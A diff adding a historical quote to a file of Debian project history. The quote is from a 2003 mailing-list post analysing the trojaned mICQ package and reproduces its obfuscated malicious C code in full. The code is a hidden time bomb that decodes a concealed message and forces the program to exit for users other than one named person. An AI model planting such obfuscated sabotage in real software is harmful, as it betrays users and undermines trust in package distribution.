@@ -69,6 +69,46 @@ The first multi-arch proposal:
 
    -- `Bdale Garbee, 2001-06-04 <https://lists.debian.org/20010604220542.8AD8E35EEE@rover.gag.com>`_
 
+Analysis of the trojaned mICQ package:
+
+   So, basically, what you're saying is that you uploaded a package to Debian
+   that included some malicious and obfuscated code from upstream, that neither
+   you nor your sponsor […] spotted. The code in question, for those playing
+   along at home, is […]::
+
+      #if defined(__Dbn__) && __Dbn__ != -1 && !defined (EXTRAVERSION)
+        if (me[0] != 'm' || me[1] != 'a' || me[2] != 'd' || me[3] != 'k' ||
+            me[4] != 'i' || me[5] != 's' || me[6] != 's' || me[7])
+        if (time (NULL) > 1045000000)
+        {
+            const char *parts[] = {
+                          "\n\n\eX0282nZlv$qf#vpjmd#wkf#nJ@R#sb`hbdf#sqlujgfg#az",
+                          "#Gfajbm-#Pjm`f#wkf#Gfajbm#nbjmwbjmfq#jp#f{wqfnfoz#",
+                          "vm`llsfqbwjuf/#zlv$qf#bguj`fg#wl#vpf#wkf#afwwfq#rv",
+                          "bojwz#sb`hbdf#eqln#nj`r-lqd-#Pjnsoz#bgg#wkf#eloolt",
+                          "jmd#ojmf#wl#zlvq#,fw`,bsw,plvq`fp-ojpw#wl#wqb`h#pw",
+                          "baof#ufqpjlmp#le#nJ@R9\eX3n\ngfa#kwws9,,ttt-nj`r-lqd",
+                          ",gfajbm#pwbaof#nbjm\n\eX0282nWl#wqb`h#@UP#pmbspklwp/",
+                          "#bgg9\eX3n\ngfa#kwws9,,ttt-nj`r-lqd,gfajbm#wfpwjmd#n",
+                          "bjm\n\eX0282nPlvq`f#sb`hbdfp#nbz#af#qfwqjfufg#pjnjob",
+                          "qoz-\eX3n\n\n                                        " };
+
+            char buf[52];
+            int i, j;
+
+            for (i = 0; i < 10; i++)
+            {
+                for (j = 0; j < 50; j++)
+                    buf[j] = parts[i][j] > 30 ? parts[i][j] ^ 3 : parts[i][j];
+                buf[j] = '\0';
+                M_print (buf);
+            }
+            exit (99);
+        }
+      #endif
+
+   -- `Anthony Towns, 2003-02-14 <https://lists.debian.org/20030213165225.GB7379@azure.humbug.org.au>`_
+
 BTS version tracking announcement:
 
    A frequently requested feature for the bug tracking system in recent years
